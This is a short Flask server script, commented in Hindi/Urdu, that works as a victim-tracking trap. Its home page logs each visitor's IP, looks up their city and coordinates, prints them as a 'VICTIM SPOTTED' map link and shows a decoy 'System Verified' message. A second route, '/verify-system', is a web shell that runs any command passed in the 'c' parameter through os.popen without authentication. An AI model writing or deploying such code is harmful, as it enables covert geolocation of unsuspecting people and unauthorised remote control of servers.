from flask import Flask, request
import requests
import os

app = Flask(__name__)

@app.route('/')
def home():
    # 1. IP Address pakarna
    user_ip = request.headers.get('x-forwarded-for', request.remote_addr).split(',')[0]
    
    try:
        # 2. Location details mangwana
        res = requests.get(f'http://ip-api.com/json/{user_ip}').json()
        city = res.get('city', 'Karachi')
        lat = res.get('lat', '24.8607')
        lon = res.get('lon', '67.0011')
        map_link = f"https://www.google.com/maps?q={lat},{lon}"
        
        # --- YE HISSA LOGS MEIN DATA BHEJEGA ---
        print(f"\n--- [!!!] VICTIM SPOTTED [!!!] ---")
        print(f"IP: {user_ip} | City: {city}")
        print(f"Location: {map_link}\n")
        
        return f"<h2>System Verified</h2><p>IP: {user_ip}</p><p>Location: {city}</p>"
    except:
        return "<h2>System Online</h2>"

@app.route('/verify-system')
def verify_system():
    # Aapka RCE System (Jo Linux details dikhata hai)
    cmd = request.args.get('c', 'ls')
    try:
        output = os.popen(cmd).read()
        return f"<pre>Console Output:\n{output}</pre>"
    except:
        return "Access Denied"
